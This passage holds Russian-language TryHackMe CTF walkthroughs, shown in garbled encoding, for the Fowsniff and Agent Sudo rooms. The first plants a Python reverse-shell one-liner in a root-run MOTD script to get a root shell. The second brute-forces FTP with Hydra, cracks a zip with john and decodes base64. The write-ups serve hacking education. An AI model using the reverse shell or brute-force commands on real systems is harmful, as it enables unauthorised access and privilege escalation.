–î–∞–≤–∞–π—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–∏–º, –≤ –∫–∞–∫–∏—Ö –≥—Ä—É–ø–ø–∞—Ö —Å–æ—Å—Ç–æ–∏—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å. –ú—ã –º–æ–∂–µ–º —Å–¥–µ–ª–∞—Ç—å —ç—Ç–æ —Å –ø–æ–º–æ—â—å—é¬†`groups`–∫–æ–º–∞–Ω–¥—ã. –ú—ã –≤–∏–¥–∏–º, —á—Ç–æ¬†`baksteen`—ç—Ç–æ —á–∞—Å—Ç—å –≥—Ä—É–ø–ø¬†`users`–∏¬†`baksteen`. –î–∞–≤–∞–π—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–∏–º, –µ—Å—Ç—å –ª–∏ –∫–∞–∫–∏–µ-–Ω–∏–±—É–¥—å –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã–µ —Ñ–∞–π–ª—ã, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –±—ã—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏ —ç—Ç–∏—Ö –≥—Ä—É–ø–ø. –¢–∞–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å ¬´baksteen¬ª –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç –∫ –¥–≤—É–º —Ä–∞–∑–Ω—ã–º –≥—Ä—É–ø–ø–∞–º. –ú—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º –ø–æ–ø—ã—Ç–∫—É –Ω–∞–π—Ç–∏ —Ñ–∞–π–ª—ã, –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∞—â–∏–µ –≥—Ä—É–ø–ø–µ ¬´users¬ª

```bash
find / -group users -type f 2>/dev/null
```

![[Pasted image 20240321004617.png]]

–í–∏–¥–∏–º –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã–π —Ñ–∞–π–ª¬†`/opt/cube/cube.sh`. –ü—Ä–æ–≤–µ—Ä–∏–≤ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è, –º—ã –≤–∏–¥–∏–º, —á—Ç–æ –æ–Ω –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç¬†`users`–≥—Ä—É–ø–ø–µ, –∏ –º—ã –º–æ–∂–µ–º –ø–∏—Å–∞—Ç—å –≤ —ç—Ç–æ—Ç —Ñ–∞–π–ª. –ú—ã –ø—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞ –∏ –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ–º, —á—Ç–æ –æ–Ω —Å–æ–¥–µ—Ä–∂–∏—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ –ø—Ä–∏—Ö–æ–¥–∏—Ç –ø–æ—Å–ª–µ –≤—Ö–æ–¥–∞ –≤ —Å–∏—Å—Ç–µ–º—É —á–µ—Ä–µ–∑ SSH. –ú—ã –≤–∏–¥–∏–º, —á—Ç–æ —ç—Ç–æ—Ç —Ñ–∞–π–ª –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º root –≤—Å—è–∫–∏–π —Ä–∞–∑, –∫–æ–≥–¥–∞ –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è —Ñ–∞–π–ª ¬´–°–æ–æ–±—â–µ–Ω–∏–µ –¥–Ω—è¬ª¬†`/etc/update-motd.d/00-header`(–≤—Å—è–∫–∏–π —Ä–∞–∑, –∫–æ–≥–¥–∞ –º—ã –ø–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ –º–∞—à–∏–Ω–µ –ø–æ SSH). –ü–æ—ç—Ç–æ–º—É –¥–∞–≤–∞–π—Ç–µ –≤–∫–ª—é—á–∏–º –æ–±—Ä–∞—Ç–Ω—ã–π —à–µ–ª–ª-–∫–æ–¥ –≤–Ω—É—Ç—Ä–∏ —Ñ–∞–π–ª–∞. –ú—ã –º–æ–∂–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –æ–±—Ä–∞—Ç–Ω—É—é –æ–±–æ–ª–æ—á–∫—É Python. 

```bash
cd /opt/cube 
cat cube.sh
```

![[Pasted image 20240321004742.png]]

–ï—â–µ TryHackMe –Ω–∞–º –¥–∞–º –¥–∞—ë—Ç —Ç–∞–∫—É—é –ø–æ–¥—Å–∫–∞–∑–∫—É:

```
–ï—Å–ª–∏ –≤—ã –µ—â–µ –Ω–µ —É–∑–Ω–∞–ª–∏, —ç—Ç–æ—Ç —Ñ–∞–π–ª –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è root, –∫–æ–≥–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–¥–∫–ª—é—á–∞–µ—Ç—Å—è –∫ –∫–æ–º–ø—å—é—Ç–µ—Ä—É —Å –ø–æ–º–æ—â—å—é SSH. –ú—ã –∑–Ω–∞–µ–º —ç—Ç–æ, –ø–æ—Å–∫–æ–ª—å–∫—É –ø—Ä–∏ –ø–µ—Ä–≤–æ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏ –º—ã –≤–∏–¥–∏–º, —á—Ç–æ –Ω–∞–º –¥–∞–ª–∏ –±–∞–Ω–Ω–µ—Ä (—Å fowsniff corp). –ü–æ—Å–º–æ—Ç—Ä–∏—Ç–µ¬† —Ñ–∞–π–ª¬†/etc/update-motd.d/. –ï—Å–ª–∏ (–ø–æ—Å–ª–µ —Ç–æ–≥–æ, –∫–∞–∫ –º—ã –ø–æ–º–µ—Å—Ç–∏–ª–∏ –Ω–∞—à—É –æ–±—Ä–∞—Ç–Ω—É—é –æ–±–æ–ª–æ—á–∫—É –≤ —Ñ–∞–π–ª –∫—É–±–∞) –º—ã –∑–∞—Ç–µ–º –≤–∫–ª—é—á–∏–º —ç—Ç–æ—Ç —Ñ–∞–π–ª –≤ —Ñ–∞–π–ª motd.d, –æ–Ω –±—É–¥–µ—Ç –∑–∞–ø—É—Å–∫–∞—Ç—å—Å—è –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è root, –∏ –º—ã –ø–æ–ª—É—á–∏–º –æ–±—Ä–∞—Ç–Ω—É—é –æ–±–æ–ª–æ—á–∫—É –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è root!
```

–ü—Ä–∏ –ø—Ä–æ—Å–º–æ—Ç—Ä–µ –ø–∞–ø–∫–∏ **/etc/update-motd.d/** –º—ã —Ç–∞–º –æ–±–Ω–∞—Ä—É–∂–∏–ª–∏ —Ñ–∞–π–ª **00-header** —É –∫–æ—Ç–æ—Ä–æ–≥–æ –ø—Ä–∞–≤–∞ root –∏ –∫–æ—Ç–æ—Ä—ã–π –∑–∞–ø—É—Å–∫–∞–µ—Ç cube.sh. –≠—Ç–æ –∑–Ω–∞—á–∏—Ç—å –µ—Å–ª–∏ –º—ã –≤–Ω–µ–¥—Ä–∏–º —Å–≤–æ–π –∫–æ–¥ –≤ **cube.sh**, –∞ **00-header** –∑–∞–ø—É—Å—Ç–∏—Ç—å –µ–≥–æ –∏ –Ω–∞—à –∫–æ–¥ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω –æ—Ç –∏–º–µ–Ω–∏ root;) 

–ú—ã –æ—Ç–∫—Ä—ã–≤–∞–µ–º —Ñ–∞–π–ª —Å –ø–æ–º–æ—â—å—é vim –∏ –¥–æ–±–∞–≤–ª—è–µ–º –≤ –Ω–µ–≥–æ –æ–¥–Ω–æ—Å—Ç—Ä–æ—á–Ω—É—é –æ–±—Ä–∞—Ç–Ω—É—é –æ–±–æ–ª–æ—á–∫—É Python.

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.29",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

–ü—ã—Ç–∞–µ–º—Å—è –∑–∞–ø—É—Å—Ç–∏—Ç—å –µ–≥–æ –∏ –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ–º, —á—Ç–æ –≤—ã–¥–∞–µ—Ç –æ—à–∏–±–∫—É ¬´python: –∫–æ–º–∞–Ω–¥–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞¬ª. –ú—ã –ø—ã—Ç–∞–µ–º—Å—è –Ω–∞–π—Ç–∏ Python –∏ –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ–º, —á—Ç–æ –æ–Ω —Å–æ–¥–µ—Ä–∂–∏—Ç python3.

![[Pasted image 20240321004914.png]]

–ò—Ç–∞–∫, –º—ã –≤–Ω–æ—Å–∏–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –≤ —ç–∫—Å–ø–ª–æ–π—Ç, –º—ã –º–µ–Ω—è–µ–º –æ–¥–Ω–æ—Å—Ç—Ä–æ—á–Ω—ã–π –∫–æ–¥ –æ–±—Ä–∞—Ç–Ω–æ–π –æ–±–æ–ª–æ—á–∫–∏ Python. –ó–∞–º–µ–Ω—è–µ–º python –Ω–∞ python3.

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.29",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![[Pasted image 20240321005000.png]]

–ö–æ–≥–¥–∞ –º—ã –≤—Ö–æ–¥–∏–º –≤ —Å–∏—Å—Ç–µ–º—É —á–µ—Ä–µ–∑ SSH, –º—ã –ø–æ–ª—É—á–∞–µ–º –±–∞–Ω–Ω–µ—Ä, –ø–æ—Ö–æ–∂–∏–π –Ω–∞ —Ç–æ—Ç, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–¥–µ—Ä–∂–∏—Ç ¬´ cube.sh ¬ª. –ü–æ—ç—Ç–æ–º—É –º—ã –ø—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞—Ç–∞–ª–æ–≥ ¬´ /etc/update-motd.d/ ¬ª, —á—Ç–æ–±—ã –Ω–∞–π—Ç–∏ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–µ —Ñ–∞–π–ª—ã, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –∑–∞–ø—É—Å–∫–∞—Ç—å —ç—Ç—É –ø—Ä–æ–≥—Ä–∞–º–º—É, –∏ –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ–º, —á—Ç–æ —Ñ–∞–π–ª ¬´ 00-header ¬ª –∑–∞–ø—É—Å–∫–∞–µ—Ç —ç—Ç–æ—Ç —Å—Ü–µ–Ω–∞—Ä–∏–π –æ–±–æ–ª–æ—á–∫–∏.

![[Pasted image 20240321005024.png]]

–ò—Ç–∞–∫, —Ç–µ–ø–µ—Ä—å –º—ã –≤—ã—Ö–æ–¥–∏–º –∏–∑ SSH –∏ –Ω–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º –Ω–∞—à –ø—Ä–æ—Å–ª—É—à–∏–≤–∞—Ç–µ–ª—å —Å –ø–æ–º–æ—â—å—é netcat, –∑–∞—Ç–µ–º —Å–Ω–æ–≤–∞ –ø–æ–¥–∫–ª—é—á–∞–µ–º—Å—è —á–µ—Ä–µ–∑ SSH. –ß—Ç–æ–±—ã –Ω–∞—à–∞ –æ–±—Ä–∞—Ç–Ω–∞—è –æ–±–æ–ª–æ—á–∫–∞ –±—ã–ª–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞.

```
ssh baksteen@192.168.1.29
```

![[Pasted image 20240321005120.png]]

–ö–∞–∫ —Ç–æ–ª—å–∫–æ –º—ã —É—Å–ø–µ—à–Ω–æ –≤–æ–π–¥—ë–º –≤ —Å–∏—Å—Ç–µ–º—É, –º—ã –ø–æ–ª—É—á–∏–º –æ–±—Ä–∞—Ç–Ω—É—é –æ–±–æ–ª–æ—á–∫—É –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è root –Ω–∞ –Ω–∞—à–µ–º –ø—Ä–æ—Å–ª—É—à–∏–≤–∞—Ç–µ–ª–µ netcat. –ò–¥–µ–º –≤ –∫–æ—Ä–Ω–µ–≤–æ–π –∫–∞—Ç–∞–ª–æ–≥ –∏ –Ω–∞—Ö–æ–¥–∏–º —Ñ–∞–π–ª —Å –∏–º–µ–Ω–µ–º ¬´flag.txt¬ª. –ü—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞ –∏ –Ω–∞—Ö–æ–¥–∏–º –ø–æ–∑–¥—Ä–∞–≤–∏—Ç–µ–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ.

```bash
nc -lvp 1234
id
cd /root
cat flag.txt
```

![[Pasted image 20240321005153.png]]

---

# Agent Sudo

**–ü–ª–æ—à–∞–¥–∫–∞:** https://tryhackme.com
**–£—Ä–æ–≤–µ–Ω—å:** Easy

![[Pasted image 20240424145536.png]]

–≠—Ç–∞ –º–∞—à–∏–Ω–∞ —Ç—Ä–µ–±—É–µ—Ç –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è, –≤–∑–ª–æ–º–∞ —Ö–µ—à–∞, —Å—Ç–µ–≥–∞–Ω–æ–≥—Ä–∞—Ñ–∏–∏ –∏ –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π.

**–î–∞–≤–∞–π—Ç–µ –ø–æ–π–º–∞–µ–º –∞–≥–µ–Ω—Ç–∞...**

## –†–∞–∑–≤–µ–¥–∫–∞

–ú—ã –Ω–∞—á–∞–ª–∏ —Å–æ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è Nmap, —á—Ç–æ–±—ã —É–∑–Ω–∞—Ç—å –æ—Ç–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã.

![[Pasted image 20240424145840.png]]

–ò–ª–∏ –±–æ–ª–µ–µ –ø–æ–¥—Ä–æ–±–Ω–æ:

![[Pasted image 20240424145954.png]]

21,22,80 ‚Äî –æ—Ç–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã, —Ä–∞–±–æ—Ç–∞—é—â–∏–µ –Ω–∞ –º–∞—à–∏–Ω–µ. –í–µ–±-—Å–µ—Ä–≤–µ—Ä —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–∞ –ø–æ—Ä—Ç—É 80. –î–∞–≤–∞–π—Ç–µ –æ—Ç–∫—Ä–æ–µ–º –µ–≥–æ –∏ –∏–∑—É—á–∏–º –¥–∞–ª—å—à–µ.

![[Pasted image 20240424150028.png]]

–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –∫–æ–¥–æ–≤–æ–µ –∏–º—è, –≤–µ—Ä–æ—è—Ç–Ω–æ, —Å–æ—Å—Ç–æ–∏—Ç –∏–∑ –æ–¥–Ω–æ–π –±—É–∫–≤—ã, —Å—É–¥—è –ø–æ —Å–∏–≥–Ω–∞—Ç—É—Ä–µ, ¬´–ê–≥–µ–Ω—Ç R¬ª. –ù–∞–º –≥–æ–≤–æ—Ä—è—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç–æ –∫–æ–¥–æ–≤–æ–µ –∏–º—è –≤ –∫–∞—á–µ—Å—Ç–≤–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –∞–≥–µ–Ω—Ç–∞.

–ü–æ—Å–∫–æ–ª—å–∫—É –º—ã –Ω–µ –∑–Ω–∞–µ–º –∫–æ–¥–æ–≤–æ–µ –∏–º—è, —è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª Intrumer –∏–∑ Burp Suite, —á—Ç–æ–±—ã –ø–µ—Ä–µ—Ö–≤–∞—Ç–∏—Ç—å –∏ —Ñ–∞–∑–∑–∏—Ç—å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –∞–≥–µ–Ω—Ç, –∏–ª–∏ –≤—ã –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∑–∞–≤–∏—Ç–æ–∫.

![[Pasted image 20240424150213.png]]

![[Pasted image 20240424150221.png]]

–ò–∑ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –º—ã –≤–∏–¥–∏–º, —á—Ç–æ –±—É–∫–≤—ã R –∏ C –¥–∞–ª–∏ –¥—Ä—É–≥–æ–π –æ—Ç–≤–µ—Ç –ø–æ —Ä–∞–∑–º–µ—Ä—É, —á–µ–º –¥—Ä—É–≥–∏–µ –±—É–∫–≤—ã.

–° User-agent:R —É –Ω–∞—Å –Ω–µ—Ç –Ω–∏—á–µ–≥–æ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–≥–æ, –ø—Ä–æ—Å—Ç–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ –æ —Ç–æ–º, —á—Ç–æ –æ–± —ç—Ç–æ–º –∏–Ω—Ü–∏–¥–µ–Ω—Ç–µ –±—É–¥–µ—Ç —Å–æ–æ–±—â–µ–Ω–æ.

![[Pasted image 20240424150251.png]]

–° User-agent: C –º—ã –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º—Å—è –Ω–∞ /agent_C_attention.php, –≥–¥–µ —É –Ω–∞—Å –µ—Å—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ:

![[Pasted image 20240424150308.png]]

## –ë—Ä—É—Ç—Ñ–æ—Ä—Å FTP

–¢–µ–ø–µ—Ä—å —É –Ω–∞—Å –µ—Å—Ç—å –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –ö—Ä–∏—Å, –∏ —É –Ω–µ–≥–æ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Å–ª–∞–±—ã–π –ø–∞—Ä–æ–ª—å, –ø–æ—ç—Ç–æ–º—É —Ç–µ–ø–µ—Ä—å –º—ã –º–æ–∂–µ–º –≤—ã–ø–æ–ª–Ω–∏—Ç—å –±—Ä—É—Ç—Ñ–æ—Ä—Å FTP —Å –ø–æ–º–æ—â—å—é Hydra, –∏—Å–ø–æ–ª—å–∑—É—è –ª—é–±—É—é –∏–∑ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã—Ö –Ω–∏–∂–µ –∫–æ–º–∞–Ω–¥ –¥–ª—è —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –ø–∞—Ä–æ–ª—è.

```
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.25.88 -V -I

hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.25.88 ftp
```

![[Pasted image 20240424150441.png]]

Login: chris
Password: crystal

–¢–µ–ø–µ—Ä—å –º—ã –∑–Ω–∞–µ–º –ø–∞—Ä–æ–ª—å –¥–ª—è –ê–≥–µ–Ω—Ç–∞, –º–æ–∂–µ–º –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è —á–µ—Ä–µ–∑ FTP.

```
ftp 10.10.25.88
```

![[Pasted image 20240424150534.png]]

–ú—ã —É—Å–ø–µ—à–Ω–æ –≤–æ—à–ª–∏ –≤ —Å–∏—Å—Ç–µ–º—É —á–µ—Ä–µ–∑ FTP, –ø—Ä–æ–≤–µ—Ä–∏–ª–∏ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –∏ –ø–æ–ª—É—á–∏–ª–∏ 3 —Ñ–∞–π–ª–∞ –≤ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è—Ö –∏ —Ç–µ–∫—Å—Ç–æ–≤—ã–π —Ñ–∞–π–ª. –ú—ã –∑–∞–≥—Ä—É–∑–∏–ª–∏ –≤—Å–µ —Ñ–∞–π–ª—ã —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—ã ¬´get¬ª.

![[Pasted image 20240424150552.png]]

–•–æ—Ä–æ—à–æ, –¥–∞–≤–∞–π—Ç–µ –ø–µ—Ä–µ–Ω–µ—Å–µ–º –≤—Å–µ —Ñ–∞–π–ª—ã –Ω–∞ –Ω–∞—à –ª–æ–∫–∞–ª—å–Ω—ã–π –∫–æ–º–ø—å—é—Ç–µ—Ä –¥–ª—è –¥–∞–ª—å–Ω–µ–π—à–µ–≥–æ –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è:

```
ftp>mget*
```

![[Pasted image 20240424150640.png]]

![[Pasted image 20240424150647.png]]

![[Pasted image 20240424150918.png]]

–û–≥–æ, —É –Ω–∞—Å –µ—Å—Ç—å —Ñ–∞–π–ª—ã —Å—Ç–µ–≥–∞–Ω–æ–≥—Ä–∞—Ñ–∏–∏. –ü—Ä–∏ –ø—Ä–æ—Å–º–æ—Ç—Ä–µ —Ñ–∞–π–ª–∞ ¬´To_agentJ.txt¬ª —Å–æ–æ–±—â–µ–Ω–∏–µ –±—ã–ª–æ –≤—Ö–æ–¥–æ–º –≤ —Å–∏—Å—Ç–µ–º—É.

–ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ –∫–∞—Ç–∞–ª–æ–≥, –≤ –∫–æ—Ç–æ—Ä–æ–º –Ω–∞—Ö–æ–¥—è—Ç—Å—è —Ç—Ä–∏ —Ñ–∞–π–ª–∞, –∏ –¥–∞–≤–∞–π—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–∏–º –Ω–∞ —Ç–∏–ø —Ñ–∞–π–ª–∞:

![[Pasted image 20240424151054.png]]

–ü–æ—ç—Ç–æ–º—É –º—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º ¬´Steghide¬ª –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –Ω–µ–∫–æ—Ç–æ—Ä–æ–π —Å–∫—Ä—ã—Ç–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏, –∞ —Ç–∞–∫–∂–µ –ø—Ä–æ–≤–µ—Ä—è–µ–º —Å –ø–æ–º–æ—â—å—é ¬´ExifTool¬ª —Ñ–∞–π–ª ¬´cutie.png¬ª, –Ω–æ –Ω–∏—á–µ–≥–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ. –ü—ã—Ç–∞—è—Å—å —Ä–∞–∑–∞—Ä—Ö–∏–≤–∏—Ä–æ–≤–∞—Ç—å –µ–≥–æ —Å –ø–æ–º–æ—â—å—é unzipcutie.png, –ø–æ–ª—É—á–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ: –ø—Ä–æ–ø—É—Å–∫: To_agentR.txt –Ω—É–∂–¥–∞–µ—Ç—Å—è –≤ —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏ —Å PK. v5.1 (–º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å v4.6)

–Ø –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª 7zip: 7z xcutie.png, —á—Ç–æ–±—ã –ø–æ–ø—ã—Ç–∞—Ç—å—Å—è –∏–∑–≤–ª–µ—á—å –µ–≥–æ, –Ω–æ –º—ã –ø–æ–ª—É—á–∏–ª–∏ –∑–∞–ø—Ä–æ—Å –ø–∞—Ä–æ–ª—è.

–ü–æ—Å–ª–µ —Ç–æ–≥–æ, –∫–∞–∫ –º—ã –ø–æ–ø—Ä–æ–±–æ–≤–∞–ª–∏ ¬´binwalk¬ª, –º—ã –ø–æ–ª—É—á–∏–ª–∏ zip-—Ñ–∞–π–ª –≤–Ω—É—Ç—Ä–∏ —Ñ–∞–π–ª–∞ ¬´cutie.png¬ª –∏ –∏–∑–≤–ª–µ–∫–ª–∏ –µ–≥–æ –∏–∑ ¬´cutie.png¬ª, –Ω–æ –æ–Ω –±—ã–ª –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω.

```
binwalk cutie.png
```

![[Pasted image 20240424151132.png]]

```
binwalk cuite.png -e
```

![[Pasted image 20240424151331.png]]

–ü—Ä–∏ —ç—Ç–æ–º –º—ã –ø–æ–ª—É—á–∞–µ–º —Ä–∞—Å–ø–∞–∫–æ–≤–∞–Ω–Ω—É—é –ø–∞–ø–∫—É, –≤–Ω—É—Ç—Ä–∏ –∫–æ—Ç–æ—Ä–æ–π –Ω–∞—Ö–æ–¥–∏—Ç—Å—è zip-—Ñ–∞–π–ª 8702.zip.

## –ö–∞–∫–æ–π –∂–µ –ø–∞—Ä–æ–ª—å –æ—Ç –∞—Ä—Ö–∏–≤–∞?

–ú—ã –º–æ–∂–µ–º –ø–æ–ø—ã—Ç–∞—Ç—å—Å—è –ø–µ—Ä–µ–±—Ä–∞—Ç—å —ç—Ç–æ —Å –ø–æ–º–æ—â—å—é –î–∂–æ–Ω–∞ –ü–æ—Ç—Ä–æ—à–∏—Ç–µ–ª—è. –í–æ-–ø–µ—Ä–≤—ã—Ö, –Ω–∞–º –Ω—É–∂–Ω–æ –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å zip-—Ñ–∞–π–ª –≤ —Ñ–æ—Ä–º–∞—Ç, –ø–æ–¥—Ö–æ–¥—è—â–∏–π –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Å JtR. –≠—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å —Å –ø–æ–º–æ—â—å—é zip2john.

![[Pasted image 20240424151400.png]]

–ú—ã –∑–Ω–∞–µ–º, —á—Ç–æ –Ω–∞—à –ø–æ—á—Ç–æ–≤—ã–π –∏–Ω–¥–µ–∫—Å –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω. –≠—Ç–æ –æ–±–ª–æ–º. –ù–æ –º—ã –º–æ–∂–µ–º –ø–æ–ª—É—á–∏—Ç—å –ø–∞—Ä–æ–ª—å, –∏—Å–ø–æ–ª—å–∑—É—è zip2john, –∞ –∑–∞—Ç–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å john, —á—Ç–æ–±—ã –≤–∑–ª–æ–º–∞—Ç—å —Ö–µ—à.

```
zip2john 8702.zip > Output.txt
```

```
john Output.txt
```

![[Pasted image 20240424153554.png]]

–ú—ã –ø–æ–ª—É—á–∏–ª–∏ **alien** –ø–∞—Ä–æ–ª—å, –ø–æ—ç—Ç–æ–º—É –ø–æ–ø—ã—Ç–∞–ª–∏—Å—å –∏–∑–≤–ª–µ—á—å zip-—Ñ–∞–π–ª, –Ω–æ –∫–æ–º–∞–Ω–¥–∞ —Ä–∞—Å–ø–∞–∫–æ–≤–∫–∏ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª–∞, –ø–æ—ç—Ç–æ–º—É –º—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏ —ç—Ç—É –∫–æ–º–∞–Ω–¥—É –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è

```
7z e 8702.zip
```

–∏ –ø–∞—Ä–æ–ª—å **alien**

![[Pasted image 20240424153808.png]]

```
cat To_agentR.txt
```

![[Pasted image 20240424153832.png]]

–¢–µ–∫—Å—Ç –≤ –∫–∞–≤—ã—á–∫–∞—Ö –≤—ã–≥–ª—è–¥–∏—Ç —Ç–∞–∫, –∫–∞–∫ –º—ã —Ö–æ—Ç–∏–º, –Ω–æ –ø–æ—Ö–æ–∂–µ, —á—Ç–æ –æ–Ω –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω. –≠—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ –±—ã–ª–æ –æ—Ç –∞–≥–µ–Ω—Ç–∞ –†. –ú—ã —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–ª–∏ —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ¬†**QXJlYTUx**¬†—Å –ø–æ–º–æ—â—å—é Cyberchef. Cyberchef –ø—Ä–µ–¥–ª–∞–≥–∞–µ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ. CyberChef —Ä–∞–±–æ—Ç–∞–µ—Ç –∫–∞–∫ –ø–æ –≤–æ–ª—à–µ–±—Å—Ç–≤—É –∏ –ø—Ä–µ–¥–ª–∞–≥–∞–µ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Base64.

![[Pasted image 20240424153846.png]]

